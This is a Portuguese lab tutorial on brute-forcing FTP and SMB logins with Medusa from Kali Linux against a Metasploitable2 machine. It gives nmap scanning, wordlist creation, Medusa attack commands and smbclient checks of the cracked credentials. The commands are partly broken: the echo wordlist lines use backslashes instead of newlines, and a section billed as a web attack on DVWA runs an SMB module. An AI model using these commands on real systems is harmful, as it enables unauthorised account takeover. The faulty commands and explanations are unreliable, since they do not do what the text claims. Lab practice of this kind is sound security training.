**Simulando um ataque de Brute Force de senhas com a Medusa em nosso Kali Linux**

**Ataque simulado**

Nesse projeto iremos usar o Metasploitable2 como a maquina alvo da invasão, e usaremos nosso Kali linux para realização dos ataques
Vale lembrar que esses ataques devem ser realiados em ambiete controlados, ou com uma autorização.

Antes de tudo, devemos verificar a comunição entre ambas maquinas por IP, nesse caso para verificar se está havendo a comunição entre a maquina alvo e maquina atacante, usaremos o comando a baixo para verificar portas abertas e comunicação.

> ping 192.168.56.102 ou nmap -Pn -sV 192.168.56.102 (o nmap é usado para verificar as portas abertas do nosso alvo)

Apois a verificação da porta aberta (Nesse caso será a porta FTP que iremos ultilizar para realização do ataque de brute force. Iremos fazer duas wordlists, uma para usuarios e outra para a senha, nessas wordlists terá varios possiveis usuarios e senhas.
Você pode usar o comando a baixo para criar as suas wordlists:

> echo -e "root\admin\ftp\user\teste" > Users.txt
> echo -e "123456\password\admin\1234\root\qwert" > Passwords.txt

segue uma breve explicação sobre o comando a cima:

echo escreve texto na saída padrão.
A opção -e faz o echo interpretar escapes de barra invertida (como \n, \t, \r, \a, \123 — octal — etc.). Ou seja: certas sequências \X são transformadas em caracteres especiais
A string entre aspas

> "123456\password\admin\1234\root\qwert"

Quando echo -e interpreta essa string, nem todos os \ são tratados da mesma forma:

> \p e \q não são escapes reconhecidos — nestes casos o echo normalmente mantém a barra invertida seguida da letra (ou seja, \p permanece \p).

> \a é reconhecido: representa o caractere BEL (campainha) — ASCII 7. Isso pode causar um bip (ou apenas um caractere invisível) no arquivo.

> \r é reconhecido: representa carriage return (CR, ASCII 13). Isso é um caractere de controle que pode retornar o cursor ao início da linha; num ficheiro ficará como um byte 0x0D.

> \123 é interpretado como escape octal (até 3 dígitos). \123 (octal) = decimal 83 = caractere ASCII 'S'. Note que, se aparece \1234, o echo toma \123 (os três dígitos) e o 4 sobra como caractere literal.
> Passwords.txt

> redireciona a saída do echo para o ficheiro Passwords.txt, sobrescrevendo o arquivo (apaga o que havia antes). Se quiser acrescentar em vez de sobrescrever, use >>.


Depis da criação das nossas wordlists, iremos executar o seguinte codigo a baixo:
Observação: Verifique o diretorio onde foi salvo as wordlists

> medusa -h 192.168.56.102 -U /path/to/wordlists/Users.txt -P /path/to/wordlists/Passwords.txt -M ftp

Segue o exemplo de para que podemos realizar a validação e checar se realmente iremos obter acesso a maquina alvo, com o usuario e senha encontrada como validas para acesso:

> smbclient -L //192.168.56.102 -U username
> smbclient //192.168.56.102/share -U username

Agora vamos para um ataque de Brute Force web, em nosso DVWA para ter acesso ao usuario e a senha com a nossas wordlists criadas (Você pode criar outras wordlists, com uma gama maior de nomes de usuarios e senhas, para um ataque com maiores possibilidades de sucesso)

segue o exemplo de um ataque ultilizado a medusa em nosso Kali Linux:
Como informado anteriomente, sempre verifique o diretorio das nossas wordlist para que possamos buscar na ultilização do medusa.

> medusa -h 192.168.56.102 -U /path/to/wordlists/small-Users.txt -P /path/to/wordlists/Pass.txt -M smbnt

Segue o exemplo de para que podemos realizar a validação e checar se realmente iremos obter acesso ao site a alvo, com o usuario e senha encontrada como validas para acesso:

> smbclient -L //192.168.56.102 -U username
> smbclient //192.168.56.102/share -U username
